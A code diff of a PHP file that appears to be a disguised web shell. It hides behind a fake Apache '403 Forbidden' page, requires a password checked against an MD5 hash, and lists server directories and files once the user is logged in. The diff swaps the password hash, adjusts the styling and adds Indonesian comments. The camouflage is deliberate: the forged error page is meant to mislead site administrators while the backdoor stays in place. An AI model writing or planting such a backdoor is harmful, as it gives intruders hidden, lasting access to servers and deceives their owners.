@@ -1,7 +1,7 @@
 <?php
 session_start();
 
-$correctPasswordHash = '5f4dcc3b5aa765d61d8327deb882cf99'; // password
+$correctPasswordHash = 'b1fbd7e666a56c405c73b4b144d69156'; // sipur
 
 if (isset($_POST['password'])) {
     $enteredPassword = $_POST['password'];
@@ -16,18 +16,19 @@ if (!isset($_SESSION['authenticated'])) {
     echo '
     <!DOCTYPE html>
     <html lang="en">
-    <head>
-        <meta charset="UTF-8">
         <title>403 Forbidden</title><br>
-        </head><body>
-        <h1>403 Forbidden</h1>
+        <h1>Forbidden</h1>
 <p>You dont have permission to access this resource.</p>
 <p>Additionally, a 403 Forbidden
 error was encountered while trying to use an ErrorDocument to handle the request.</p>
         <style>
             body {
-                font-family: Arial, sans-serif;
+                font-family: Roboto;
                 background-color: white;
+                padding: 10px;
+                top: 0;
+                left: 10px;
+                border-bottom-right-radius: 5px;
                 color: black;
                 margin: 0;
                 padding: 0;
@@ -42,7 +43,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
                 padding: 10px;
                 border-radius: 5px;
             }
-            .password-form input[type="  "] {
+            .password-form input[type=""] {
                 background-color: transparent;
                 border: 1px solid white;
                 color: white;
@@ -260,6 +261,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
         }
     }
 
+    // Tampilkan direktori di barisan atas
     echo '<div class="directory-contents">';
     foreach ($directories as $dir) {
         $dirPath = $currentDir . DIRECTORY_SEPARATOR . $dir;
@@ -273,6 +275,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
     ?>
     <h2>File List</h2>
     <?php
+    // Tampilkan file di barisan bawah
     echo '<div class="file-list">';
     foreach ($filesList as $file) {
         $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
